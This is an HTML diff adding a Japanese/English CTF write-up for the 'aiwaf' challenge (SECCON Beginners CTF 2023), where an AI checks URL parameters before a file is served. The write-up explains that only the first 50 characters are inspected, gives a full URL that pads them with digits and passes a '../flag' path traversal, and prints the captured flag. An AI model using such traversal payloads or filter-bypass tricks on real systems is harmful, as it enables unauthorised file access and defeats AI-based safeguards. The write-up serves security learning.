@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>aiwaf (SECCON Beginners CTF 2023) Writeup</title>
+<script src="../../../../common/common.js"></script>
+</head>
+<body>
+<language-selector data-langlist="日本語,ja,English,en"></language-selector>
+<h1>aiwaf</h1>
+<div class="language-selector-ja" lang="ja">
+<p>
+WebページのURLと、サーバのファイル一式が与えられた。
+</p>
+<p>
+与えられたファイルの中に、ファイル <code>aiwaf/app/flag</code> があった。<br>
+また、<code>aiwaf/app/app.py</code> には、パラメータをAIでチェック後、URLの <code>file</code> パラメータで指定したファイルを返す機能があった。
+</p>
+<p>
+チェック対象はパラメータの最初の50文字だけなので、この部分を攻撃とは関係ない文字列で埋めればよい。<br>
+以下のURLにアクセスすると、flagが得られた。
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+An URL of a web page and files for the server were given.
+</p>
+<p>
+There was a file <code>aiwaf/app/flag</code> in the given files.<br>
+Also, the file <code>aiwaf/app/app.py</code> had a function that returns a file specified by the <code>file</code> parameter in the URL after checking the parameters using an AI.
+</p>
+<p>
+Only the first 50 characters of the parameter is checked, so we should fill this part with a string that is unrelated with attacking.<br>
+I obtained the fiag by accessing this URL.
+</p>
+</div>
+<code-block data-extension="txt">
+https://aiwaf.beginners.seccon.games/?ai=01234567890123456789012345678901234567890123456789&amp;file=../flag
+</code-block>
+
+<div class="flag">ctf4b{pr0mp7_1nj3c710n_c4n_br34k_41_w4f}</div>
+<hr>
+<writeup-by></writeup-by>
+<p>
+<a href="../../" class="language-aware-link">SECCON Beginners CTF 2023</a>
+</p>
+</body>
+</html>
